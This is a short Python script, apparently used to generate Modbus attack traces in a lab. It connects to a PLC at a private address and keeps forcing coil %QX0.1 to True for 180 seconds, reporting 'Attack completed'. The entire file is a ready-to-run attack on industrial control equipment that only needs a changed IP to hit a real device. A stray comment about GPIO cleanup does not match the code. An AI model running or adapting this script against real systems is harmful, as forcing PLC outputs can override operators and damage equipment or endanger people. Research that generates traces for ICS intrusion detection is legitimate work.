# generate_traces_with_timestamp.py
#!/usr/bin/env python3

import sys
import time
from pymodbus.client import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException

ip = "10.120.39.1"
client = ModbusClient(ip, port=502)
client.connect()
target = "0.1" #QX
address = 8*(int(target.split(".")[0])) + int(target.split(".")[1])
value = True
duration = 180

print(f"{target} , {value} , {duration}")

try:
    start_time = time.time()
    while time.time() - start_time < duration:
        client.write_coil(address, value)
    print("Attack completed ")
except KeyboardInterrupt:
    # If Ctrl+C is pressed, clean up the GPIO settings
    print("Stopping attack ")


